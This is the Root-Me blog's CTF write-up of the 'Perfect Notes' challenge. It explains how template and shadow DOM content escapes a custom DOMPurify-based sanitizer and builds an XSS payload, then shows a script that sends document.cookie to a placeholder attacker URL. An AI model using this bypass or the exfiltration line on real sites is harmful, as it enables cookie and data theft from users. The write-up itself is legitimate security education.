<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Writeup - Root-Me CTF 10k - Perfect Notes - Root-Me Blog</title><meta name="Description" content="Root Me allows everyone to test and improve their knowledge in computer security and hacking. Legal. Free. Realistic."><meta property="og:title" content="Writeup - Root-Me CTF 10k - Perfect Notes" />
<meta property="og:description" content="Writeup of the &lsquo;Perfect Notes&rsquo; challenge during the Root-Me CTF 10k" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.root-me.org/posts/writeup_ctf10k_perfect_notes/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-03-02T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-03-02T00:00:00+00:00" /><meta property="og:site_name" content="Root-Me Blog" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Writeup - Root-Me CTF 10k - Perfect Notes"/>
<meta name="twitter:description" content="Writeup of the &lsquo;Perfect Notes&rsquo; challenge during the Root-Me CTF 10k"/>
<meta name="application-name" content="Root-Me Blog">
<meta name="apple-mobile-web-app-title" content="Root-Me Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.root-me.org/posts/writeup_ctf10k_perfect_notes/" /><link rel="prev" href="https://blog.root-me.org/posts/writeup_ctf10k_proxifier/" /><link rel="next" href="https://blog.root-me.org/posts/how-to-start/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Writeup - Root-Me CTF 10k - Perfect Notes",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/blog.root-me.org\/posts\/writeup_ctf10k_perfect_notes\/"
        },"genre": "posts","keywords": "writeups, CTF10k, DOM Clobbering, Challenge, XSS","wordcount":  1059 ,
        "url": "https:\/\/blog.root-me.org\/posts\/writeup_ctf10k_perfect_notes\/","datePublished": "2023-03-02T00:00:00+00:00","dateModified": "2023-03-02T00:00:00+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "K√©vin_Mizu"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Root-Me Blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="https://www.root-me.org/IMG/logo/siteon0.svg"
        data-srcset="https://www.root-me.org/IMG/logo/siteon0.svg, https://www.root-me.org/IMG/logo/siteon0.svg 1.5x, https://www.root-me.org/IMG/logo/siteon0.svg 2x"
        data-sizes="auto"
        alt="https://www.root-me.org/IMG/logo/siteon0.svg"
        title="https://www.root-me.org/IMG/logo/siteon0.svg" />Root-Me Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Root-Me Blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="https://www.root-me.org/IMG/logo/siteon0.svg"
        data-srcset="https://www.root-me.org/IMG/logo/siteon0.svg, https://www.root-me.org/IMG/logo/siteon0.svg 1.5x, https://www.root-me.org/IMG/logo/siteon0.svg 2x"
        data-sizes="auto"
        alt="https://www.root-me.org/IMG/logo/siteon0.svg"
        title="https://www.root-me.org/IMG/logo/siteon0.svg" />Root-Me Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Writeup - Root-Me CTF 10k - Perfect Notes</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://www.root-me.org/Mizu" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>K√©vin_Mizu</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeups</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-03-02">2023-03-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1059 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#-introduction">üìú Introduction</a></li>
    <li><a href="#-recon">üïµÔ∏è Recon</a></li>
    <li><a href="#-nodeiterator">üîÅ NodeIterator</a></li>
    <li><a href="#-shadow-dom">üëª Shadow DOM</a></li>
    <li><a href="#-xss">üç™ XSS</a></li>
    <li><a href="#-flag">üéâ Flag</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/perfect_notes/rootme_ctf.png"
        data-srcset="/assets/images/writeups/perfect_notes/rootme_ctf.png, /assets/images/writeups/perfect_notes/rootme_ctf.png 1.5x, /assets/images/writeups/perfect_notes/rootme_ctf.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/perfect_notes/rootme_ctf.png"
        title="rootme_ctf.png" /></p>
<hr>
<ul>
<li><strong>Difficulty</strong>: 500 points | 1 solves</li>
<li><strong>Description</strong> : A new notes service with some custom features has been created. Your job? Get the admin&rsquo;s secret note :)</li>
<li><strong>NB</strong> : The exploitation is feasible on a Chromium-based browser.</li>
<li><strong>Author</strong> : K√©vin_Mizu</li>
</ul>
<hr>
<h2 id="-introduction">üìú Introduction</h2>
<p>This challenge was the hardest web challenge of the CTF and also the only client side. This challenge has been flagged by only one person (<a href="https://twitter.com/Feelzor_" target="_blank" rel="noopener noreffer ">@Feelzor_</a>) which found an unnatended solution, you can find his writeup here: <a href="https://github.com/FeelZoR/Writeups/blob/main/CTF_10k_RootMe/web/PerfectNotes.md" target="_blank" rel="noopener noreffer ">link</a>. My mistake occurs inside the HTML sanitizer which we will see later in this writeup, I have forgotten to sanitize DOM Clobbering before accessing a node attribute.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/perfect_notes/meme1.jpg"
        data-srcset="/assets/images/writeups/perfect_notes/meme1.jpg, /assets/images/writeups/perfect_notes/meme1.jpg 1.5x, /assets/images/writeups/perfect_notes/meme1.jpg 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/perfect_notes/meme1.jpg"
        title="meme1.png" /></p>
<p>In this writeup, we will act like this unattended solution does not exist ü•≤</p>
<h2 id="-recon">üïµÔ∏è Recon</h2>
<p>Starting this challenge, we face a pretty simple interface which asks us for a username:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/perfect_notes/home.png"
        data-srcset="/assets/images/writeups/perfect_notes/home.png, /assets/images/writeups/perfect_notes/home.png 1.5x, /assets/images/writeups/perfect_notes/home.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/perfect_notes/home.png"
        title="home.png" /></p>
<p>Filling it by whatever we want, we arrived into a simple note manager, which allows us to create a note with a title and a body:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/perfect_notes/notes1.png"
        data-srcset="/assets/images/writeups/perfect_notes/notes1.png, /assets/images/writeups/perfect_notes/notes1.png 1.5x, /assets/images/writeups/perfect_notes/notes1.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/perfect_notes/notes1.png"
        title="notes1.png" /></p>
<p>Something really important to try in such case is to create a second account and try to access the notes of the first one. In our situation, it seems that knowning the UUID of the notes of a user make to access it!</p>
<p>Furthermore, testing few XSS payloads seems not to work. So, before going further, let&rsquo;s check the source code of the page. Digging into it, we could find this pretty interesting class:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// source: https://github.com/cure53/DOMPurify/blob/e0970d88053c1c564b6ccd633b4af7e7d9a10375/src/purify.js#L866
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">_isClobbered</span> <span class="o">=</span> <span class="p">(</span><span class="nx">elm</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="nx">elm</span> <span class="k">instanceof</span> <span class="nx">HTMLFormElement</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="k">typeof</span> <span class="nx">elm</span><span class="p">.</span><span class="nx">nodeName</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">            <span class="k">typeof</span> <span class="nx">elm</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">            <span class="k">typeof</span> <span class="nx">elm</span><span class="p">.</span><span class="nx">removeChild</span> <span class="o">!==</span> <span class="s1">&#39;function&#39;</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">            <span class="o">!</span><span class="p">(</span><span class="nx">elm</span><span class="p">.</span><span class="nx">attributes</span> <span class="k">instanceof</span> <span class="nx">NamedNodeMap</span><span class="p">)</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">            <span class="k">typeof</span> <span class="nx">elm</span><span class="p">.</span><span class="nx">removeAttribute</span> <span class="o">!==</span> <span class="s1">&#39;function&#39;</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">            <span class="k">typeof</span> <span class="nx">elm</span><span class="p">.</span><span class="nx">setAttribute</span> <span class="o">!==</span> <span class="s1">&#39;function&#39;</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">            <span class="k">typeof</span> <span class="nx">elm</span><span class="p">.</span><span class="nx">namespaceURI</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">            <span class="k">typeof</span> <span class="nx">elm</span><span class="p">.</span><span class="nx">insertBefore</span> <span class="o">!==</span> <span class="s1">&#39;function&#39;</span> <span class="o">||</span>
</span></span><span class="line"><span class="cl">            <span class="k">typeof</span> <span class="nx">elm</span><span class="p">.</span><span class="nx">hasChildNodes</span> <span class="o">!==</span> <span class="s1">&#39;function&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">class</span> <span class="nx">Sanitizer</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">version</span> <span class="o">=</span> <span class="s2">&#34;1.0.0&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">creator</span> <span class="o">=</span> <span class="s2">&#34;@kevin_mizu&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// source: https://github.com/cure53/DOMPurify/blob/main/src/tags.js
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">this</span><span class="p">.</span><span class="nx">ALLOWED_TAGS</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">,</span> <span class="s2">&#34;abbr&#34;</span><span class="p">,</span> <span class="p">...,</span> <span class="s2">&#34;video&#34;</span><span class="p">,</span> <span class="s2">&#34;wbr&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// source: https://github.com/cure53/DOMPurify/blob/main/src/attrs.js
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">this</span><span class="p">.</span><span class="nx">ALLOWED_ATTRIBUTES</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;accept&#34;</span><span class="p">,</span> <span class="s2">&#34;action&#34;</span><span class="p">,</span> <span class="p">...,</span> <span class="s2">&#34;xmlns&#34;</span><span class="p">,</span> <span class="s2">&#34;slot&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">sanitize</span> <span class="o">=</span> <span class="p">(</span><span class="nx">input</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">currentNode</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">dom_tree</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMParser</span><span class="p">().</span><span class="nx">parseFromString</span><span class="p">(</span><span class="nx">input</span><span class="p">,</span> <span class="s2">&#34;text/html&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">tag_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">nodeIterator</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createNodeIterator</span><span class="p">(</span><span class="nx">dom_tree</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">((</span><span class="nx">currentNode</span> <span class="o">=</span> <span class="nx">nodeIterator</span><span class="p">.</span><span class="nx">nextNode</span><span class="p">()))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">switch</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">.</span><span class="nx">nodeType</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">case</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">ELEMENT_NODE</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                    <span class="kd">var</span> <span class="nx">tag_name</span>   <span class="o">=</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">nodeName</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                    <span class="kd">var</span> <span class="nx">attributes</span> <span class="o">=</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">attributes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="c1">// avoid DOMClobbering
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="k">if</span> <span class="p">(</span><span class="nx">_isClobbered</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="nx">currentNode</span><span class="p">.</span><span class="nx">parentElement</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="c1">// avoid mXSS
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">currentNode</span><span class="p">.</span><span class="nx">namespaceURI</span> <span class="o">!==</span> <span class="s2">&#34;http://www.w3.org/1999/xhtml&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="nx">currentNode</span><span class="p">.</span><span class="nx">parentElement</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="c1">// sanitize tags
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">ALLOWED_TAGS</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">tag_name</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">                        <span class="nx">currentNode</span><span class="p">.</span><span class="nx">parentElement</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="c1">// sanitize attributes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">attributes</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">ALLOWED_ATTRIBUTES</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">attributes</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">name</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">                            <span class="nx">currentNode</span><span class="p">.</span><span class="nx">parentElement</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">dom_tree</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>As we can see, it&rsquo;s a custom HTML Sanitizer which use few parts of <a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener noreffer ">DOMPurify</a> for the sanitization</p>
<p>But, before continuing, how does an HTML sanitizer works?</p>
<p>An HTML Sanitizer such as <a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener noreffer ">DOMPurify</a> is quite different from a basic regex / replace sanitization. In fact, without parsing the input like a browser and iterating over each nodes, there is now way to clean an input correctly. That&rsquo;s why modern HTML sanitizer works like described below:
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/perfect_notes/sanitizer.png"
        data-srcset="/assets/images/writeups/perfect_notes/sanitizer.png, /assets/images/writeups/perfect_notes/sanitizer.png 1.5x, /assets/images/writeups/perfect_notes/sanitizer.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/perfect_notes/sanitizer.png"
        title="sanitizer" /></p>
<ol>
<li>The user input is parsed using <a href="https://developer.mozilla.org/en-US/docs/Web/API/DOMParser" target="_blank" rel="noopener noreffer ">DOMParser</a> API to generate a new DOM Tree (which is like doing a normal HTML Browser parsing).</li>
<li>The generated output is sanitized via <a href="https://developer.mozilla.org/en-US/docs/Web/API/NodeIterator" target="_blank" rel="noopener noreffer ">NodeIterator</a> which allows to iterate over all nodes in a DOM Tree. (Or maybe not üëÄ)</li>
<li>The sanitized DOM Tree is then seriliazed via the innerHTML attribute and then returned to the user or directly to the DOM.</li>
</ol>
<p>In our case, we can see that, the sanitizer removes:</p>
<ul>
<li>DOMClobbering</li>
<li>mXSS</li>
<li>Tags and attributes not allowed by DOMPurify</li>
</ul>
<h2 id="-nodeiterator">üîÅ NodeIterator</h2>
<p>Because it&rsquo;s using <a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener noreffer ">DOMPurify</a> code fragments, at the first look it could seem to be secure but, this is where <a href="https://developer.mozilla.org/en-US/docs/Web/API/NodeIterator" target="_blank" rel="noopener noreffer ">NodeIterator</a> issue comes! If fact, even if it is not written in the MDN documentation, the <code>NodeIterator</code> API won&rsquo;t follow external DOM Tree such as <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe" target="_blank" rel="noopener noreffer ">ShadowDOM</a>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">dom_tree</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMParser</span><span class="p">().</span><span class="nx">parseFromString</span><span class="p">(</span><span class="s2">&#34;&lt;template&gt;&lt;h1&gt;HELLO&lt;/h1&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;text/html&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">nodeIterator</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createNodeIterator</span><span class="p">(</span><span class="nx">dom_tree</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">((</span><span class="nx">currentNode</span> <span class="o">=</span> <span class="nx">nodeIterator</span><span class="p">.</span><span class="nx">nextNode</span><span class="p">()))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">.</span><span class="nx">nodeName</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Output:</p>
<pre tabindex="0"><code>#document
HTML
HEAD
TEMPLATE
BODY
</code></pre><p>As you can see, the <code>h1</code> tag doesn&rsquo;t appear in the output!</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/perfect_notes/meme2.jpg"
        data-srcset="/assets/images/writeups/perfect_notes/meme2.jpg, /assets/images/writeups/perfect_notes/meme2.jpg 1.5x, /assets/images/writeups/perfect_notes/meme2.jpg 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/perfect_notes/meme2.jpg"
        title="meme2.png" /></p>
<h2 id="-shadow-dom">üëª Shadow DOM</h2>
<p>The above finding will be really useful as everything inside the shadow DOM won&rsquo;t be sanitized:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Sanitizer</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nx">s</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="s2">&#34;&lt;template&gt;&lt;img src=x onerror=alert()&gt;&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>Output:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;&lt;</span><span class="nt">template</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;x&#34;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;alert()&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">template</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;&lt;</span><span class="nt">body</span><span class="p">&gt;&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Perfect! We have our payload, let&rsquo;s simply use it, get an XSS and flag the challenge üî• Well, unfortunately that won&rsquo;t be that much simple&hellip;</p>
<ul>
<li>What is a Shadow DOM?</li>
</ul>
<p>As well described in the MDN documentation (<a href="https://developer.mozilla.org/en-US/docs/Web/Web_Components/Using_shadow_DOM" target="_blank" rel="noopener noreffer ">link</a>), a shadow DOM is an important aspect of web components encapsulation. It allows to markup structure, style&hellip; For example, if you set style in it, it will only be applied for the nodes inside:
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/perfect_notes/shadow.png"
        data-srcset="/assets/images/writeups/perfect_notes/shadow.png, /assets/images/writeups/perfect_notes/shadow.png 1.5x, /assets/images/writeups/perfect_notes/shadow.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/perfect_notes/shadow.png"
        title="shadow" /></p>
<p>Furthermore, shadow DOM as few important points:</p>
<ol>
<li>It can be created via javascript or <code>template</code> tag.</li>
<li>It can only loads at the DOM Tree generation or need to use the <code>attachShadow</code> API to do so. (impossible to add dynamicly a <code>template</code> tag with innerHTML)</li>
<li>A shadow DOM can&rsquo;t load inside the <code>head</code> tag.</li>
<li>It has 2 status open and closed. A closed shadow DOM can&rsquo;t load javascript. This can be done via javascript or <code>shadowroot</code> attribute. (The default value is closed)
*<em>PS: it is a really short introduction of the subject. Feel free to go further by reading documentation!</em></li>
</ol>
<p>Now that we have a better understanding of what is shadow DOM and how it works, we know why our payload isn&rsquo;t working. We have to:</p>
<ul>
<li>Escape <code>head</code> tag.</li>
<li>Switch <code>shadowroot</code> to open.</li>
</ul>
<p>Thus, using the following payload, we finally get our XSS! üéâ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;&lt;</span><span class="nt">template</span> <span class="na">shadowroot</span><span class="o">=</span><span class="s">&#34;open&#34;</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;alert()&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/perfect_notes/xss.png"
        data-srcset="/assets/images/writeups/perfect_notes/xss.png, /assets/images/writeups/perfect_notes/xss.png 1.5x, /assets/images/writeups/perfect_notes/xss.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/perfect_notes/xss.png"
        title="xss.png" /></p>
<p><em>PS: The shadowroot attribute isn&rsquo;t inside the DOMPurify allow list, I have added it especially for this challenge.</em></p>
<h2 id="-xss">üç™ XSS</h2>
<p>Now that we have an XSS, we can try to exfiltrate the bot cookies:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;https://&lt;attacker-url&gt;?&#34;</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">))</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></span></code></pre></div><p>But, after waiting 5 minutes, nothing comes&hellip; Which means that the cookie has the <code>HttpOnly</code> flag&hellip; So, we have to find a different way to get an access to admin&rsquo;s notes. By testing a bit the website, we could find a very interesting feature. If you are connected and you access the root URL, it will redirect you to your notes. (based on your session)</p>
<p>So, we could abuse it to force the admin fetching the root URL and exfiltrate the result page URL which will contain is notes!</p>
